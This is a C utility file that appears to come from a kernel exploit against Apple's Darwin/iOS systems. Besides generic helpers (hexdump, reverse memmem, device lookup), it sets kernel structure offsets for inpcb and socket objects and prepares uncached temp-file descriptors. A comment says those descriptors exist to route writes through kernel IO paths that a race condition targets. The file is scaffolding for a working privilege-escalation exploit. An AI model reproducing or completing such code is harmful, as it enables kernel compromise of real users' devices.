#include "utils.h"

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/sysctl.h>
#include <sys/utsname.h>
#include <unistd.h>

void* cs2_reverse_memmem(const void* haystack, size_t haystack_len, const void* needle, size_t needle_len) {
    if (needle_len == 0) return (void*)haystack;

    if (haystack_len < needle_len) return NULL;

    const char* h = (const char*)haystack;
    const char* n = (const char*)needle;

    for (size_t i = haystack_len - needle_len + 1; i-- > 0;) {
        if (memcmp(h + i, n, needle_len) == 0) {
            return (void*)(h + i);
        }
    }

    return NULL;
}

void cs2_hexdump(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

int cs2_offsets_init(void) {
    cs2_offsets.inpcb_inp_socket = koffsetof(inpcb, socket);
    cs2_offsets.inpcb_icmp6filt = koffsetof(inpcb, icmp6filt);
    cs2_offsets.socket_so_count = koffsetof(socket, usecount);
    return 0;
}

char* cs2_machine(void) {
    // identify device
    if (cs2_ctx.device_machine[0] != '\0') {
        return cs2_ctx.device_machine;
    }

    struct utsname uts = {};
    uname(&uts);
    snprintf(cs2_ctx.device_machine, sizeof(cs2_ctx.device_machine), "%s", uts.machine);
    LOG("Running on %s", cs2_ctx.device_machine);
    return cs2_ctx.device_machine;
}

static void create_target_file(char* path) {
    FILE* fp = fopen(path, "wb");
    // default_file_content is set to random marker
    fwrite(cs2_ctx.default_file_content, 1, cs2_ctx.target_file_size, fp);
    fclose(fp);
}

void cs2_init_files(void) {
    // original does calloc, we've already allocated it in the global context, so set both to 0
    memset(cs2_ctx.read_file_path, 0, sizeof(cs2_ctx.read_file_path));
    memset(cs2_ctx.write_file_path, 0, sizeof(cs2_ctx.write_file_path));
    confstr(_CS_DARWIN_USER_TEMP_DIR, cs2_ctx.read_file_path, sizeof(cs2_ctx.read_file_path));
    confstr(_CS_DARWIN_USER_TEMP_DIR, cs2_ctx.write_file_path, sizeof(cs2_ctx.write_file_path));
    snprintf(cs2_ctx.read_file_path + strlen(cs2_ctx.read_file_path), sizeof(cs2_ctx.read_file_path) - strlen(cs2_ctx.read_file_path), "/%08x", arc4random());
    snprintf(cs2_ctx.write_file_path + strlen(cs2_ctx.write_file_path), sizeof(cs2_ctx.write_file_path) - strlen(cs2_ctx.write_file_path), "/%08x", arc4random());

    // creates file at temp
    create_target_file(cs2_ctx.read_file_path);
    create_target_file(cs2_ctx.write_file_path);

    cs2_ctx.read_fd = open(cs2_ctx.read_file_path, O_RDWR);
    cs2_ctx.write_fd = open(cs2_ctx.write_file_path, O_RDWR);
    /* calib-exact delta #3 (2026-10-24 cross-ref): F_NOCACHE routes pwritev
       into the direct/cluster IO paths (the window family the calib races
       through, and the dest-side of vm_map_get_upl) instead of the buffered
       page-cache copyin. The calib's fdMark runs F_NOCACHE; cs2's fd did
       not — the last remaining file-path delta between the two races. */
    fcntl(cs2_ctx.read_fd, F_NOCACHE, 1);
    fcntl(cs2_ctx.write_fd, F_NOCACHE, 1);

    LOG("read_fd: %x", cs2_ctx.read_fd);
    LOG("write_fd: %x", cs2_ctx.write_fd);

    // files will be deleted when fd is closed
    remove(cs2_ctx.read_file_path);
    remove(cs2_ctx.write_file_path);

    // no cache
    fcntl(cs2_ctx.read_fd, F_NOCACHE, 1);
    fcntl(cs2_ctx.write_fd, F_NOCACHE, 1);
}
